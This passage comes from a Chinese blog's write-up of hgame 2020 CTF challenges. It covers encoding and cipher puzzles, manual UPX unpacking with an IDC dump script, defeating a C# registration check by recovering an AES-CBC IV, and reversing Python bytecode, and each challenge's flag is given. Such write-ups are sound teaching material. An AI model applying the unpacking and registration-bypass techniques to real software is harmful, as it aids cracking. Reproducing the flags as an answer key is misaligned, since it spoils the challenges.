..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--'</span>))</span><br></pre></td></tr></table></figure>

<p>这里还有符号的摩斯电码，大部分的在线解码都没有，所以自己写了一个，解码出来补上hgame：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;W3LC0ME_TO_2020_HGAM3&#125;</span><br></pre></td></tr></table></figure>

<h4 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h4><p>下载解压，是张图片，自然想到隐写，binwalk跑出来，发现是个压缩包，打开压缩包，发现需要密码，密码是这张照片在P站的ID，P站未知原因打不开，上B站找到了ID：76953815</p>
<p>解压出来打开flag.txt，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\u68\u67\u61\u6d\u65\u7b\u44\u6f\u5f\u79\u30\u75\u5f\u4b\u6e\u4f\u57\u5f\u75\u4e\u69\u43\u30\u64\u33\u3f\u7d</span><br></pre></td></tr></table></figure>

<p>unicode编码，解码得：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;Do_y0u_KnOW_uNiC0d3?&#125;</span><br></pre></td></tr></table></figure>

<h4 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h4><p>压缩包打开，有一个密码提示和一个新的压缩包，Password.txt得内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y   h jnsxf qjFjf jnb  rg fiyykwtbsnkm tm  xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.</span><br><span class="line"></span><br><span class="line">JRFVJYFZVRUAGMAI</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">* Three fences first, Five Caesar next. English sentense first,  zip password next.</span><br></pre></td></tr></table></figure>

<p>根据提示，把上面的内容用3个字符得栅栏密码和5个字符得凯撒密码解密，得到一段英文和压缩包的密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Many years later as he faced the firing squad, Colonel Aureliano Buendia was to remember that distant afternoon when his father took him to discover ice.</span><br><span class="line"></span><br><span class="line">EAVMUBAQHQMVEPDT</span><br></pre></td></tr></table></figure>

<p>解压出来得到一个新的txt文件，里面是莫名其妙的Ook语言,用在线工具翻译为text，得到一段base32编码大的字符串，base32解密之后得到了又一串编码过的字符，试一试base64，发现解码出来的内容有很多乱码，不过是PNG开头，应该是base64转图片，写个python脚本解码，得到一个二维码，扫码得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;3Nc0dInG_@lL_iN_0Ne!&#125;</span><br></pre></td></tr></table></figure>

<p>这题有各种各样的编码，还不错</p>
<h2 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2><h3 id="RE-1"><a href="#RE-1" class="headerlink" title="RE"></a>RE</h3><h4 id="unpack"><a href="#unpack" class="headerlink" title="unpack"></a>unpack</h4><p>明显upx脱壳，但是经过了万恶的出题人修改，不能用工具，只能手动脱壳<br>由于是linux可执行文件，PE常用的工具都没法用，只能开虚拟机用IDA远程调试，主要目的还是找到OEP，并且由于是linux程序，还省去了重建输入表的麻烦，直接就可以运行（虽然运不运行并不是很重要，主要是脱壳之后反编译出来）<br>脱壳的过程借鉴<a href="https://www.52pojie.cn/thread-1048649-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1048649-1-1.html</a><br>很少有人对ELF64文件加壳，教程也很少，直接使用里面的idc修改目录导出</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;idc.idc&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_LOAD              1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_DYNAMIC           2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> ImageBase,StartImg,EndImg;</span><br><span class="line">  <span class="keyword">auto</span> e_phoff;</span><br><span class="line">  <span class="keyword">auto</span> e_phnum,p_offset;</span><br><span class="line">  <span class="keyword">auto</span> i,dumpfile;</span><br><span class="line">  ImageBase=<span class="number">0x400000</span>;</span><br><span class="line">  StartImg=<span class="number">0x400000</span>;</span><br><span class="line">  EndImg=<span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">if</span> (Dword(ImageBase)==<span class="number">0x7f454c46</span> || Dword(ImageBase)==<span class="number">0x464c457f</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(dumpfile=fopen(<span class="string">"D:\\dumpfile"</span>,<span class="string">"wb"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      e_phoff=ImageBase+Qword(ImageBase+<span class="number">0x20</span>);</span><br><span class="line">      Message(<span class="string">"e_phoff = 0x%x\n"</span>, e_phoff);</span><br><span class="line">      e_phnum=Word(ImageBase+<span class="number">0x38</span>);</span><br><span class="line">      Message(<span class="string">"e_phnum = 0x%x\n"</span>, e_phnum);</span><br><span class="line">      <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;e_phnum;i++)</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">if</span> (Dword(e_phoff)==PT_LOAD || Dword(e_phoff)==PT_DYNAMIC)</span><br><span class="line">         &#123; </span><br><span class="line">			p_offset=Qword(e_phoff+<span class="number">0x8</span>);</span><br><span class="line">            StartImg=Qword(e_phoff+<span class="number">0x10</span>);</span><br><span class="line">            EndImg=StartImg+Qword(e_phoff+<span class="number">0x28</span>);</span><br><span class="line">            Message(<span class="string">"start = 0x%x, end = 0x%x, offset = 0x%x\n"</span>, StartImg, EndImg, p_offset);</span><br><span class="line">            dump(dumpfile,StartImg,EndImg,p_offset);</span><br><span class="line">            Message(<span class="string">"dump segment %d ok.\n"</span>,i);</span><br><span class="line">         &#125;    </span><br><span class="line">         e_phoff=e_phoff+<span class="number">0x38</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      fseek(dumpfile,<span class="number">0x3c</span>,<span class="number">0</span>);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line"></span><br><span class="line">      fseek(dumpfile,<span class="number">0x28</span>,<span class="number">0</span>);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">	  </span><br><span class="line">      fclose(dumpfile);</span><br><span class="line">    &#125;<span class="keyword">else</span> Message(<span class="string">"dump err."</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">dump</span><span class="params">(dumpfile,startimg,endimg,offset)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> i;</span><br><span class="line">  <span class="keyword">auto</span> size;</span><br><span class="line">  size=endimg-startimg;</span><br><span class="line">  fseek(dumpfile,offset,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i=<span class="number">0</span>; i &lt; size; i=i+<span class="number">1</span> ) </span><br><span class="line">  &#123;</span><br><span class="line">	fputc(Byte(startimg+i),dumpfile);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>尝试在虚拟机里面运行，发现可以运行，代表脱壳成功，反编译，通过提示语找到程序处理输入的部分</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">scanf</span>((__int64)<span class="string">"%42s"</span>, v7);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">41</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i + v7[i] != (<span class="keyword">unsigned</span> __int8)byte_6CA0A0[i] )</span><br><span class="line">      v5 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="string">"Wrong input"</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Wrong input"</span>, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="string">"Congratulations! Flag is your input"</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Congratulations! Flag is your input"</span>, v7);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>本题主要考验手动脱壳的技巧，对于加密部分并没有设置太多的难度，直接导出6CA0A0处的数组然后进行逆变换就得到了flag</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">            &#123;</span><br><span class="line">                    <span class="number">0x68</span>, <span class="number">0x68</span>, <span class="number">0x63</span>, <span class="number">0x70</span>, <span class="number">0x69</span>, <span class="number">0x80</span>, <span class="number">0x5B</span>, <span class="number">0x75</span>, <span class="number">0x78</span>, <span class="number">0x49</span>,</span><br><span class="line">                    <span class="number">0x6D</span>, <span class="number">0x76</span>, <span class="number">0x75</span>, <span class="number">0x7B</span>, <span class="number">0x75</span>, <span class="number">0x6E</span>, <span class="number">0x41</span>, <span class="number">0x84</span>, <span class="number">0x71</span>, <span class="number">0x65</span>,</span><br><span class="line">                    <span class="number">0x44</span>, <span class="number">0x82</span>, <span class="number">0x4A</span>, <span class="number">0x85</span>, <span class="number">0x8C</span>, <span class="number">0x82</span>, <span class="number">0x7D</span>, <span class="number">0x7A</span>, <span class="number">0x82</span>, <span class="number">0x4D</span>,</span><br><span class="line">                    <span class="number">0x90</span>, <span class="number">0x7E</span>, <span class="number">0x92</span>, <span class="number">0x54</span>, <span class="number">0x98</span>, <span class="number">0x88</span>, <span class="number">0x96</span>, <span class="number">0x98</span>, <span class="number">0x57</span>, <span class="number">0x95</span>,</span><br><span class="line">                    <span class="number">0x8F</span>, <span class="number">0xA6</span></span><br><span class="line">            &#125;;</span><br><span class="line">    <span class="built_in">string</span> flag;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">42</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            flag+=ida_chars[i]-i;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;flag&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后输出flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;Unp@cking_1s_R0m4ntic_f0r_r3vers1ng&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Classic-CrackMe"><a href="#Classic-CrackMe" class="headerlink" title="Classic_CrackMe"></a>Classic_CrackMe</h4><p>PEiD查看一下，没壳，编写语言是Microsoft Visual C# / Basic .NET，C#逆向没有难度，</p>
<p>dnSpy打开就和源码几乎没什么区别，这题显然难度不在这，反编译之后找到按键click事件，关键代码就在这里</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">button1_Click</span>(<span class="params"><span class="keyword">object</span> sender, EventArgs e</span>)</span></span><br><span class="line"><span class="function"></span>		&#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">this</span>.status == <span class="number">1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				MessageBox.Show(<span class="string">"你已经激活成功啦，快去提交flag吧~~~"</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">string</span> text = <span class="keyword">this</span>.textBox1.Text;</span><br><span class="line">			<span class="keyword">if</span> (text.Length != <span class="number">46</span> || text.IndexOf(<span class="string">"hgame&#123;"</span>) != <span class="number">0</span> || text.IndexOf(<span class="string">"&#125;"</span>) != <span class="number">45</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				MessageBox.Show(<span class="string">"Illegal format"</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">string</span> base64iv = text.Substring(<span class="number">6</span>, <span class="number">24</span>);</span><br><span class="line">			<span class="keyword">string</span> str = text.Substring(<span class="number">30</span>, <span class="number">15</span>);</span><br><span class="line">			<span class="keyword">try</span></span><br><span class="line">			&#123;</span><br><span class="line">				Aes aes = <span class="keyword">new</span> Aes(<span class="string">"SGc0bTNfMm8yMF9XZWVLMg=="</span>, base64iv);</span><br><span class="line">				Aes aes2 = <span class="keyword">new</span> Aes(<span class="string">"SGc0bTNfMm8yMF9XZWVLMg=="</span>, <span class="string">"MFB1T2g5SWxYMDU0SWN0cw=="</span>);</span><br><span class="line">				<span class="keyword">string</span> text2 = aes.DecryptFromBase64String(<span class="string">"mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I="</span>);</span><br><span class="line">				<span class="keyword">if</span> (text2.Equals(<span class="string">"Same_ciphertext_"</span>))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">byte</span>[] array = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">16</span>];</span><br><span class="line">					Array.Copy(aes2.EncryptToByte(text2 + str), <span class="number">16</span>, array, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">					<span class="keyword">if</span> (Convert.ToBase64String(array).Equals(<span class="string">"dJntSWSPWbWocAq4yjBP5Q=="</span>))</span><br><span class="line">					&#123;</span><br><span class="line">						MessageBox.Show(<span class="string">"注册成功！"</span>);</span><br><span class="line">						<span class="keyword">this</span>.Text = <span class="string">"已激活，欢迎使用！"</span>;</span><br><span class="line">						<span class="keyword">this</span>.status = <span class="number">1</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						MessageBox.Show(<span class="string">"注册失败！\nhint: "</span> + aes2.DecryptFromBase64String(<span class="string">"mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I="</span>));</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					MessageBox.Show(<span class="string">"注册失败！\nhint: "</span> + aes2.DecryptFromBase64String(<span class="string">"mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I="</span>));</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span></span><br><span class="line">			&#123;</span><br><span class="line">				MessageBox.Show(<span class="string">"注册失败！"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>发现最终考察的还是aes的cbc模式，我们输入的flag被掐头去尾分成了两部分，前一部分作为第一个aes实例的base64iv，第二段作为第二个实例的明文后半段，具体原理可以百度。</p>
<p>对于第一部分，每个key解密一组密文的结果是一样的只是iv不同，明文不同，所以只需要另找一组iv，求出这个解密之后的结果（解密出来的明文 xor FakeIV），然后在异或我们已知的明文就可以得到结果</p>
<p>对于第二部分，根据原理我们知道，后面的部分并不影响前面的加密结果，所以直接把一致的明文加密，然后再和已知的密文合并在一起，得到整体的一个密文，然后解密出来的后半部分就是我们需要的字符串。</p>
<p>不过这里需要注意几点，注意输入输出的数据类型，并且对于第二部分的处理要记得填充字符，因为第二部分只有15位，要填充到16位才能运算，一开始这里没注意，花了好长时间结果还是错的。</p>
<p>直接python解决：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 传入的key和iv都是bytes类型，加密输出的是经过base64编码之后的密文，解密传入的也是base64编码过后的密文</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AesCrypter</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key, iv)</span>:</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.iv = iv</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pkcs7padding</span><span class="params">(self, text)</span>:</span></span><br><span class="line">        bs = AES.block_size  <span class="comment"># 16</span></span><br><span class="line"></span><br><span class="line">        length = len(text)</span><br><span class="line">        bytes_length = len(bytes(text, encoding=<span class="string">'utf-8'</span>))</span><br><span class="line">        padding_size = length <span class="keyword">if</span> (bytes_length == length) <span class="keyword">else</span> bytes_length</span><br><span class="line">        padding = bs - padding_size % bs</span><br><span class="line">        padding_text = chr(padding) * padding</span><br><span class="line">        <span class="keyword">return</span> text + padding_text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pkcs7unpadding</span><span class="params">(self, text)</span>:</span></span><br><span class="line">        length = len(text)</span><br><span class="line">        unpadding = ord(text[length - <span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> text[<span class="number">0</span>:length - unpadding]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, content)</span>:</span></span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)</span><br><span class="line">        content_padding = self.pkcs7padding(content)</span><br><span class="line">        aes_encode_bytes = cipher.encrypt(bytes(content_padding, encoding=<span class="string">'utf-8'</span>))</span><br><span class="line">        result = base64.b64encode(aes_encode_bytes).decode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, content)</span>:</span></span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)</span><br><span class="line">        <span class="comment"># base64解码</span></span><br><span class="line">        aes_encode_bytes = base64.b64decode(content)</span><br><span class="line">        <span class="comment"># 解密</span></span><br><span class="line">        aes_decode_bytes = cipher.decrypt(aes_encode_bytes)</span><br><span class="line">        <span class="comment"># 重新编码</span></span><br><span class="line">        result = aes_decode_bytes.decode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="comment"># 去除填充内容</span></span><br><span class="line">        result = self.pkcs7unpadding(result)</span><br><span class="line">        <span class="keyword">if</span> result == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = base64.b64decode(<span class="string">"SGc0bTNfMm8yMF9XZWVLMg=="</span>)</span><br><span class="line">fakeIV = base64.b64decode(<span class="string">'MFB1T2g5SWxYMDU0SWN0cw=='</span>)</span><br><span class="line">plainText = <span class="string">"Same_ciphertext_"</span></span><br><span class="line">ciperText = <span class="string">"mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I="</span></span><br><span class="line"></span><br><span class="line">aesCipher = AesCrypter(key, fakeIV)</span><br><span class="line"></span><br><span class="line">fakePlainText = aesCipher.decrypt(ciperText)</span><br><span class="line"><span class="comment"># print(fakePlainText)</span></span><br><span class="line">IV = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    IV += chr(ord(fakePlainText[i]) ^ fakeIV[i] ^ ord(plainText[i]))</span><br><span class="line"><span class="comment"># print("IV : " + IV)</span></span><br><span class="line"><span class="comment"># /TyXYzPnY;$)\we_</span></span><br><span class="line">IV = base64.b64encode(IV.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">cipherText2 = aesCipher.encrypt(plainText)</span><br><span class="line">cipherText2 = base64.b64decode(cipherText2).hex()[:<span class="number">32</span>]</span><br><span class="line">cipherText3 = <span class="string">'dJntSWSPWbWocAq4yjBP5Q=='</span></span><br><span class="line">cipherText3 = base64.b64decode(cipherText3).hex()[:<span class="number">32</span>]</span><br><span class="line"><span class="comment"># print(cipherText2 + cipherText3)</span></span><br><span class="line">cipherText4 = bytes.fromhex(cipherText2 + cipherText3)</span><br><span class="line">cipherText4 = base64.b64encode(cipherText4)</span><br><span class="line"><span class="comment"># print(cipherText4)</span></span><br><span class="line">plainText3 = aesCipher.decrypt(cipherText4)</span><br><span class="line"><span class="comment"># print(plainText3)</span></span><br><span class="line"><span class="comment"># Same_ciphertext_DiFfer3Nt_w0r1d</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">flag += <span class="string">'hgame&#123;'</span> + IV + plainText3[<span class="number">16</span>:] + <span class="string">'&#125;'</span></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># hgame&#123;L1R5WFl6UG5ZOyQpXHdlXw==DiFfer3Nt_w0r1d&#125;</span></span><br></pre></td></tr></table></figure>

<p>最终的flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;L1R5WFl6UG5ZOyQpXHdlXw&#x3D;&#x3D;DiFfer3Nt_w0r1d&#125;</span><br></pre></td></tr></table></figure>

<h4 id="babyPy"><a href="#babyPy" class="headerlink" title="babyPy"></a>babyPy</h4><p>这题比较简单，把log和dis指令表对照一下就能还原出来函数的原型来</p>
<p>dis指令表见<a href="https://docs.python.org/3/library/dis.html#python-bytecode-instructions" target="_blank" rel="noopener">https://docs.python.org/3/library/dis.html#python-bytecode-instructions</a></p>
<p>还原出来的函数原型（想打死命名的人）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(OOo)</span>:</span></span><br><span class="line"> O0O = OOo[::<span class="number">-1</span>]</span><br><span class="line"> O0o = list(O0O)</span><br><span class="line"> <span class="keyword">for</span> O0 <span class="keyword">in</span> range(<span class="number">1</span>, len(O0o)):</span><br><span class="line"> 	Oo = O0o[O0<span class="number">-1</span>] ^ O0o[O0]</span><br><span class="line"> 	O0o[O0] = Oo</span><br><span class="line"> O = bytes(O0o)</span><br><span class="line"> <span class="keyword">return</span> O.hex()</span><br></pre></td></tr></table></figure>

<p>所以只需要反过来异或一遍就可以了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = bytes.fromhex(<span class="string">'7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22'</span>)</span><br><span class="line">c = list(str)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c) - <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">    c[i] ^= c[i - <span class="number">1</span>]</span><br><span class="line">print(bytes(c[::<span class="number">-1</span>]))</span><br></pre></td></tr></table></figure>

<p>输出flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;sT4cK_1$_sO_e@Sy~~&#125;</span><br></pre></td></tr></table></figure>


        </div>
        
        <div class="level is-size-7 is-uppercase">
            <div class="level-start">
                <div class="level-item">
                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
                    <a class="has-link-grey -link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="has-link-grey -link" href="/tags/hgame/" rel="tag">hgame</a>, <a class="has-link-grey -link" href="/tags/re/" rel="tag">re</a>
                </div>
            </div>
        </div>
        
        
        
    </div>
</div>



<div class="card">
    <div class="card-content">
        <h3 class="menu-label has-text-centered">Like this article? Support the author with</h3>
        <div class="buttons is-centered">
            
                
<div class="notification is-danger">
    You forgot to set the <code>qrcode</code> for Alipay. Please set it in <code>_config.yml</code>.
</div>

                
                
<div class="notification is-danger">
    You forgot to set the <code>qrcode</code> for Wechat. Please set it in <code>_config.yml</code>.
</div>

                
                <!-- Visit https://www.paypal.com/donate/buttons/ to get your donate button -->

<div class="notification is-danger">
    You forgot to set the <code>business</code> and <code>currency_code</code> for Paypal. Please set it in <code>_config.yml</code>.
</div>

                
                
<div class="notification is-danger">
    You forgot to set the <code>url</code> Patreon. Please set it in <code>_config.yml</code>.
</div>

                
        </div>
    </div>
</div>



<div class="card card-transparent">
    <div class="level post-navigation is-flex-wrap is-mobile">
        
        
        <div class="level-end">
            <a class="level level-item has-link-grey  article-nav-next" href="/2020/01/11/bugku-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">
                <span class="level-item">bugku-re部分题解</span>
                <i class="level-item fas fa-chevron-right"></i>
            </a>
        </div>
        
    </div>
</div>


</div>
                




<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
    
        
<div class="card widget">
    <div class="card-content">
        <nav class="level">
            <div class="level-item has-text-centered" style="flex-shrink: 1">
                <div>
                    
                    <figure class="image is-128x128 has-mb-6">
                        <img class="is-rounded" src="https://q2.qlogo.cn/headimg_dl?dst_uin=595371936&amp;spec=100" alt="Aorui Zhang">
                    </figure>
                    
                    <p class="is-size-4 is-block">
                        Aorui Zhang
                    </p>
                    
                    
                    
                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
                        <i class="fas fa-map-marker-alt has-mr-7"></i>
                        <span>ShaanXi,Xi&#39;an</span>
                    </p>
                    
                </div>
            </div>
        </nav>
        <nav class="level is-mobile">
            <div class="level-item has-text-centered is-marginless">
                <div>
                    <p class="heading">
                        Posts
                    </p>
                    <a href="/archives">
                        <p class="title has-text-weight-normal">
                            6
                        </p>
                    </a>
                </div>
            </div>
            <div class="level-item has-text-centered is-marginless">
                <div>
                    <p class="heading">
                        Categories
                    </p>
                    <a href="/categories">
                        <p class="title has-text-weight-normal">
                            0
                        </p>
                    </a>
                </div>
            </div>
            <div class="level-item has-text-centered is-marginless">
                <div>
                    <p class="heading">
                        Tags
                    </p>
                    <a href="/tags">
                        <p class="title has-text-weight-normal">
                            7
                        </p>
                    </a>
                </div>
            </div>
        </nav>
        
        <div class="level">
            <a class="level-item button is-link is-rounded" href="https://github.com/schrodinger17" target="_blank" rel="noopener">
                Follow</a>
        </div>
        
        
        
        <div class="level is-mobile">
            
            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
                title="Github" href="https://github.com/schrodinger17">
                
                <i class="fab fa-github"></i>
                
            </a>
            
        </div>
        
    </div>
</div>
    
        

    <div class="card widget" id="toc">
        <div class="card-content">
            <div class="menu">
                <h3 class="menu-label">
                    Catalogue
                </h3>
                <ul class="menu-list"><li>
        <a class="is-flex" href="#Week1">
        <span class="has-mr-6">1</span>
        <span>Week1</span>
        </a><ul class="menu-list"><li>
        <a class="is-flex" href="#Web">
        <span class="has-mr-6">1.1</span>
        <span>Web</span>
        </a><ul class="menu-list"><li>
        <a class="is-flex" href="#接-头-霸-王">
        <span class="has-mr-6">1.1.1</span>
        <span>接 头 霸 王</span>
        </a></li></ul></li><li>
        <a class="is-flex" href="#RE">
        <span class="has-mr-6">1.2</span>
        <span>RE</span>
        </a><ul class="menu-list"><li>
        <a class="is-flex" href="#maze">
        <span class="has-mr-6">1.2.1</span>
        <span>maze</span>
        </a></li><li>
        <a class="is-flex" href="#bitwise-operation2">
        <span class="has-mr-6">1.2.2</span>
        <span>bitwise_operation2</span>
        </a></li><li>
        <a class="is-flex" href="#advance">
        <span class="has-mr-6">1.2.3</span>
        <span>advance</span>
        </a></li><li>
        <a class="is-flex" href="#cpp">
        <span class="has-mr-6">1.2.4</span>
        <span>cpp</span>
        </a></li></ul></li><li>
        <a class="is-flex" href="#PWN">
        <span class="has-mr-6">1.3</span>
        <span>PWN</span>
        </a><ul class="menu-list"><li>
        <a class="is-flex" href="#Hard-AAAAA">
        <span class="has-mr-6">1.3.1</span>
        <span>Hard_AAAAA</span>
        </a></li></ul></li><li>
        <a class="is-flex" href="#Crypto">
        <span class="has-mr-6">1.4</span>
        <span>Crypto</span>
        </a><ul class="menu-list"><li>
        <a class="is-flex" href="#InfantRSA">
        <span class="has-mr-6">1.4.1</span>
        <span>InfantRSA</span>
        </a></li></ul></li><li>
        <a class="is-flex" href="#misc">
        <span class="has-mr-6">1.5</span>
        <span>misc</span>
        </a><ul class="menu-list"><li>
